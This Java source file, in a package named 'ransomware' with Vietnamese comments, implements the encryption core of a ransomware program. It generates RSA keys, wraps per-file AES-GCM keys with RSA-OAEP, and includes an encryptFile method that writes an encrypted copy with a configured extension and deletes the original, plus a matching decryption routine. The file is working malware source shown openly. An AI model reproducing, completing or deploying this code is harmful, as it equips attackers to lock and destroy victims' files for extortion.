package ransomware;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.GeneralSecurityException;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.X509EncodedKeySpec;

/**
 * Tiện ích mã hóa RSA + AES
 */
public final class CryptoUtils {

    private CryptoUtils() {}

    // ============================================================
    // 1. TẠO CẶP KHÓA RSA
    // ============================================================

    public static KeyPair generateRSAKeyPair() throws NoSuchAlgorithmException {
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
        kpg.initialize(Config.RSA_KEY_SIZE, new SecureRandom());
        return kpg.genKeyPair();
    }

    // ============================================================
    // 2. LƯU / ĐỌC KHÓA RSA
    // ============================================================

    public static void savePublicKey(PublicKey key, String path) throws IOException {
        Path p = Paths.get(path);
        if (p.getParent() != null) {
            Files.createDirectories(p.getParent());
        }
        Files.write(p, key.getEncoded());
    }

    public static void savePrivateKey(PrivateKey key, String path) throws IOException {
        Path p = Paths.get(path);
        if (p.getParent() != null) {
            Files.createDirectories(p.getParent());
        }
        Files.write(p, key.getEncoded());
    }

    public static PublicKey loadPublicKey(String path) throws Exception {
        byte[] data = Files.readAllBytes(Paths.get(path));
        X509EncodedKeySpec spec = new X509EncodedKeySpec(data);
        return KeyFactory.getInstance("RSA").generatePublic(spec);
    }

    public static PrivateKey loadPrivateKey(String path) throws Exception {
        byte[] data = Files.readAllBytes(Paths.get(path));
        PKCS8EncodedKeySpec spec = new PKCS8EncodedKeySpec(data);
        return KeyFactory.getInstance("RSA").generatePrivate(spec);
    }

    // ============================================================
    // 3. TẠO AES KEY
    // ============================================================

    public static SecretKey generateAESKey() throws NoSuchAlgorithmException {
        KeyGenerator kg = KeyGenerator.getInstance("AES");
        kg.init(Config.AES_KEY_SIZE, new SecureRandom());
        return kg.generateKey();
    }

    // ============================================================
    // 4. MÃ HÓA AES KEY BẰNG RSA PUBLIC
    // ============================================================

    public static byte[] encryptAESKeyWithRSA(SecretKey aesKey, PublicKey rsaPublic)
            throws GeneralSecurityException {
        Cipher rsa = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
        rsa.init(Cipher.ENCRYPT_MODE, rsaPublic);
        return rsa.doFinal(aesKey.getEncoded());
    }

    // ============================================================
    // 5. GIẢI MÃ AES KEY BẰNG RSA PRIVATE
    // ============================================================

    public static SecretKey decryptAESKeyWithRSA(byte[] encryptedAesKey,
                                                 PrivateKey rsaPrivate)
            throws GeneralSecurityException {
        Cipher rsa = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
        rsa.init(Cipher.DECRYPT_MODE, rsaPrivate);
        byte[] aesKeyBytes = rsa.doFinal(encryptedAesKey);
        return new SecretKeySpec(aesKeyBytes, "AES");
    }

    // ============================================================
    // 6. ENCRYPT ENVELOPE
    // ============================================================

    public static byte[] encryptWithEnvelope(byte[] data, PublicKey rsaPublic)
            throws GeneralSecurityException, NoSuchAlgorithmException {
        SecretKey aesKey = generateAESKey();

        byte[] iv = new byte[Config.IV_SIZE];
        new SecureRandom().nextBytes(iv);

        Cipher aes = Cipher.getInstance("AES/GCM/NoPadding");
        aes.init(Cipher.ENCRYPT_MODE, aesKey,
                new GCMParameterSpec(Config.TAG_BITS, iv));
        byte[] ciphertext = aes.doFinal(data);

        byte[] encKey = encryptAESKeyWithRSA(aesKey, rsaPublic);

        ByteBuffer buf = ByteBuffer.allocate(
                4 + encKey.length + iv.length + ciphertext.length);
        buf.putInt(encKey.length);
        buf.put(encKey);
        buf.put(iv);
        buf.put(ciphertext);
        return buf.array();
    }

    // ============================================================
    // 7. DECRYPT ENVELOPE
    // ============================================================

    public static byte[] decryptWithEnvelope(byte[] data, PrivateKey rsaPrivate)
            throws GeneralSecurityException {
        ByteBuffer buf = ByteBuffer.wrap(data);

        int keyLen = buf.getInt();
        byte[] encKey = new byte[keyLen];
        buf.get(encKey);

        byte[] iv = new byte[Config.IV_SIZE];
        buf.get(iv);

        byte[] ciphertext = new byte[buf.remaining()];
        buf.get(ciphertext);

        SecretKey aesKey = decryptAESKeyWithRSA(encKey, rsaPrivate);

        Cipher aes = Cipher.getInstance("AES/GCM/NoPadding");
        aes.init(Cipher.DECRYPT_MODE, aesKey,
                new GCMParameterSpec(Config.TAG_BITS, iv));
        return aes.doFinal(ciphertext);
    }

    // ============================================================
    // 8. ENCRYPT FILE
    // ============================================================

    public static void encryptFile(File input, PublicKey rsaPublic)
            throws IOException, GeneralSecurityException, NoSuchAlgorithmException {
        byte[] data = Files.readAllBytes(input.toPath());
        byte[] encrypted = encryptWithEnvelope(data, rsaPublic);

        Path encryptedPath = Paths.get(input.getPath() + Config.ENCRYPTED_EXT);
        Files.write(encryptedPath, encrypted);

        Files.delete(input.toPath());
    }

    // ============================================================
    // 9. DECRYPT FILE
    // ============================================================

    public static void decryptFile(File encrypted, PrivateKey rsaPrivate)
            throws IOException, GeneralSecurityException {
        byte[] data = Files.readAllBytes(encrypted.toPath());
        byte[] plaintext = decryptWithEnvelope(data, rsaPrivate);

        String path = encrypted.getPath();
        String originalPath = path.substring(0,
                path.length() - Config.ENCRYPTED_EXT.length());
        Files.write(Paths.get(originalPath), plaintext);

        Files.delete(encrypted.toPath());
    }
}